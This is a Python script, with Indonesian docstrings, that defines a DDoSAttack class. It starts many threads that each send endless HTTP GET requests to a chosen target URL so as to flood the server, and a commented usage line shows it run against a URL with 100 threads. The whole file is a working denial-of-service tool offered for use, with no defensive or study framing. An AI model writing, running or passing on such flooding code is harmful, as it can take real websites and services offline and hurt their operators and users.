import threading
import requests
import logging

logger = logging.getLogger(__name__)

class DDoSAttack:
    def __init__(self, target_url, num_threads):
        self.target_url = target_url
        self.num_threads = num_threads

    def send_request(self):
        """
        Mengirimkan request untuk membanjiri server.
        """
        try:
            while True:
                response = requests.get(self.target_url)
                if response.status_code == 200:
                    logger.info(f"Sent request to {self.target_url}")
        except Exception as e:
            logger.error(f"Error during DDoS attack: {str(e)}")

    def start_attack(self):
        """
        Memulai serangan DDoS dengan beberapa thread.
        """
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_request)
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()

# Contoh penggunaan:
# ddos = DDoSAttack("http://example.com", 100)
# ddos.start_attack()
